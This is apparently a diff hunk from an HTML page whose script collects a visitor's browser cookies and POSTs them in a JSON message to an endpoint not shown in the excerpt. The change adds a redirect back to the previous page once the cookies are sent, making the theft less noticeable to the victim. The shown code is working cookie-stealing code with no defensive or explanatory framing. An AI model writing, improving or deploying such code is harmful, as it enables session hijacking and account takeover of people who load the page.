@@ -20,7 +20,11 @@
     method: 'POST',
     headers: {'Content-Type': 'application/json'},
     body: JSON.stringify({content: 'DUmbass HaCkEr Cookie: ' + cookies})
-  }).then(r => console.log(r.ok ? 'Cookies sent.' : 'Failed to send cookies.')).catch(e => console.error('Error:', e));
+  }).then(r => {
+    console.log(r.ok ? 'Cookies sent.' : 'Failed to send cookies.');
+    // Redirect back to the previous page
+    window.history.back();
+  }).catch(e => console.error('Error:', e));
 </script>
 </body>
 </html>
